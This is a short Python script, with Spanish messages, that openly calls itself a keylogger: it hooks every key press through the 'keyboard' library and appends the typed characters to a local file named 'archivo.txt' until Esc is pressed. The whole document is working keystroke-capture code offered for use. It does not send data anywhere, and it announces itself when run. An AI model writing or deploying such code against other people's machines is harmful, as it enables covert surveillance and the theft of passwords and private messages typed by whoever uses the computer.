import keyboard
LOG_FILE = "archivo.txt"

def log(eve):
    if eve.event_type == keyboard.KEY_DOWN:      
        if eve.name == 'enter':
            caracter = '\n'       
        elif eve.name == 'space':
            caracter = ' '
        elif len(eve.name) > 1:
            return
        else:
            caracter = eve.name       
        open(LOG_FILE, 'a').write(caracter)

print(f"Keylogger en: {LOG_FILE}. Pon 'esc' para detener")
keyboard.hook(log)
keyboard.wait('esc') 


